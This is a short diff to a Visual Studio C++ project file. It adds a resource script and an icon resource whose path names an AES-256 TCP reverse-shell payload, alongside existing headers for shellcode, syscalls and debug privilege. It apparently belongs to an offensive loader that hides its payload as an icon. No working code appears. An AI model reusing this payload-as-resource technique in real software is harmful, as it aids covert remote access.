@@ -140,9 +140,16 @@
     <ClInclude Include="Init.h" />
     <ClInclude Include="EventLog.h" />
     <ClInclude Include="mystructs.h" />
+    <ClInclude Include="resource.h" />
     <ClInclude Include="SeDebugPrivilege.h" />
     <ClInclude Include="shellcode.h" />
     <ClInclude Include="SyscallStuff.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="Resource.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="..\..\Payloads\aes256-tcp-reverse-exit-func.ico" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
